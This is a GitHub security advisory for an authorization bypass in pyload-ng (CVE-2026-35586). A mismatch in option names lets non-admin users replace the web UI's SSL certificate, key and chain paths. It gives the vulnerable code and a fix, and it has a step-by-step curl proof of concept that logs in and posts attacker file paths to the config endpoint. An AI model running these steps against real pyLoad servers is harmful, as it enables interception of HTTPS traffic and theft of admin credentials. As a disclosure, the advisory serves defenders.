# [M] pyload-ng: Authorization Bypass for SSL Certificate/Key Configuration Due to Option Name Mismatch in pyload-ng

## Summary
Severity: Medium
Advisory: GHSA-ppvx-rwh9-7rj7
CVE: CVE-2026-35586
CWE: CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-ppvx-rwh9-7rj7
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0 <0.5.0b3.dev97

## Details
## Summary

The `ADMIN_ONLY_CORE_OPTIONS` authorization set in `set_config_value()` uses incorrect option names `ssl_cert` and `ssl_key`, while the actual configuration option names are `ssl_certfile` and `ssl_keyfile`. This name mismatch causes the admin-only check to always evaluate to False, allowing any user with SETTINGS permission to overwrite the SSL certificate and key file paths. Additionally, the `ssl_certchain` option was never added to the admin-only set at all.

## Details

The vulnerability is in `src/pyload/core/api/__init__.py`. The `ADMIN_ONLY_CORE_OPTIONS` set is defined at lines 237-248:

```python
ADMIN_ONLY_CORE_OPTIONS = {
    ("general", "storage_folder"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "password"),
    ("proxy", "username"),
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "ssl_cert"),      # BUG: should be "ssl_certfile"
    ("webui", "ssl_key"),       # BUG: should be "ssl_keyfile"
    ("webui", "use_ssl"),
}
# NOTE: ("webui", "ssl_certchain") is entirely missing
```

The actual config option names are defined in `src/pyload/core/config/default.cfg:39-41`:

```
file ssl_certfile : "SSL Certificate" = ssl.crt
file ssl_keyfile : "SSL Key" = ssl.key
file ssl_certchain : "CA's intermediate certificate bundle (optional)" =
```

The authorization check at line 267 compares the incoming `(category, option)` tuple against this set:

```python
if (category, option) in ADMIN_ONLY_CORE_OPTIONS and not is_admin:
    self.pyload.log.error(...)
    return
```

When a request arrives with `option=ssl_certfile`, the check evaluates `("webui", "ssl_certfile") in ADMIN_ONLY_CORE_OPTIONS` which is **False** because the set contains `("webui", "ssl_cert")`, not `("webui", "ssl_certfile")`. The admin-only guard is bypassed and `config.set()` at line 271 proceeds to write the attacker-supplied value.

The value is cast as a `file` type in `parser.py:300-305`, which resolves it via `os.path.realpath()` but performs no further validation:

```python
elif typ in ("file", "folder"):
    return (
        ""
        if value in (None, "")
        else os.path.realpath(os.path.expanduser(os.fsdecode(value)))
    )
```

On server restart with SSL enabled, the webserver loads the attacker-controlled paths (`webserver_thread.py:22-23,51-52`):

```python
self.certfile = self.pyload.config.get("webui", "ssl_certfile")
self.keyfile = self.pyload.config.get("webui", "ssl_keyfile")
# ...
self.server.ssl_adapter = BuiltinSSLAdapter(
    self.certfile, self.keyfile, self.certchain
)
```

## PoC

Prerequisites: A pyLoad instance with SSL enabled and a non-admin user account that has SETTINGS permission.

**Step 1:** Authenticate as the non-admin user to get a session cookie:
```bash
curl -c cookies.txt -X POST 'http://localhost:8000/login' \
  -d 'username=settingsuser&password=password123'
```

**Step 2:** Set the SSL certificate to an attacker-controlled file path:
```bash
curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_certfile": "/tmp/attacker.crt"}}'
```
Expected response: `true` (config saved successfully)

**Step 3:** Set the SSL key to an attacker-controlled file path:
```bash
curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_keyfile": "/tmp/attacker.key"}}'
```
Expected response: `true` (config saved successfully)

**Step 4:** Set the SSL certificate chain (never protected):
```bash
curl -b cookies.txt -X POST 'http://localhost:8000/json/save_config' \
  -H 'Content-Type: application/json' \
  -d '{"category": "core", "config": {"webui|ssl_certchain": "/tmp/attacker-chain.crt"}}'
```
Expected response: `true` (config saved successfully)

**Step 5:** After the server restarts, it will load the attacker's certificate and key for all HTTPS connections.

## Impact

A non-admin user with SETTINGS permission can replace the SSL certificate and key used by the pyLoad HTTPS server. When the server restarts (or is restarted by an admin), it will serve HTTPS using the attacker's certificate/key pair. This enables:

- **Man-in-the-Middle attacks:** The attacker, possessing the private key for the now-active certificate, can intercept and decrypt all HTTPS traffic to the pyLoad instance, including admin credentials and session tokens.
- **Credential theft:** All users (including admins) connecting over HTTPS will have their credentials exposed to the attacker.
- **Configuration tampering:** With intercepted admin credentials, the attacker can escalate to full admin access.

The attack requires SSL to already be enabled by an admin (the `use_ssl` option is correctly protected), the attacker to place certificate/key files on the filesystem (potentially achievable via pyLoad's download functionality), and a server restart.

## Recommended Fix

Fix the option names in `ADMIN_ONLY_CORE_OPTIONS` and add the missing `ssl_certchain` option in `src/pyload/core/api/__init__.py`:

```python
ADMIN_ONLY_CORE_OPTIONS = {
    ("general", "storage_folder"),
    ("log", "syslog_host"),
    ("log", "syslog_port"),
    ("proxy", "password"),
    ("proxy", "username"),
    ("reconnect", "script"),
    ("webui", "host"),
    ("webui", "ssl_certfile"),    # Fixed: was "ssl_cert"
    ("webui", "ssl_keyfile"),     # Fixed: was "ssl_key"
    ("webui", "ssl_certchain"),   # Added: was missing entirely
    ("webui", "use_ssl"),
}
```

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-ppvx-rwh9-7rj7
- https://nvd.nist.gov/vuln/detail/CVE-2026-35586
- https://github.com/pyload/pyload
- https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-123.yaml
